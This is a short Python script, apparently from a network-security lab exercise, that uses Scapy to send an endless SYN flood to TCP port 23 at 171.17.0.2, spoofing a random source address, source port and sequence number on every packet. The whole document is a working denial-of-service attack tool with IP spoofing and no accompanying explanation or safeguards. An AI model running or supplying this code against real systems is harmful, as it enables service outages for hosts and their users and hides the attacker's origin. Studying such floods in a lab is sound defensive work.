from scapy.all import IP,TCP,send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="171.17.0.2")
tcp = TCP(dport=23,flags="S")
pkt = ip/tcp
while True:
   pkt[IP].src = str(IPv4Address(getrandbits(32)))
   pkt[TCP].sport = getrandbits(16)
   pkt[TCP].seq  = getrandbits(32)
   send(pkt,verbose=0)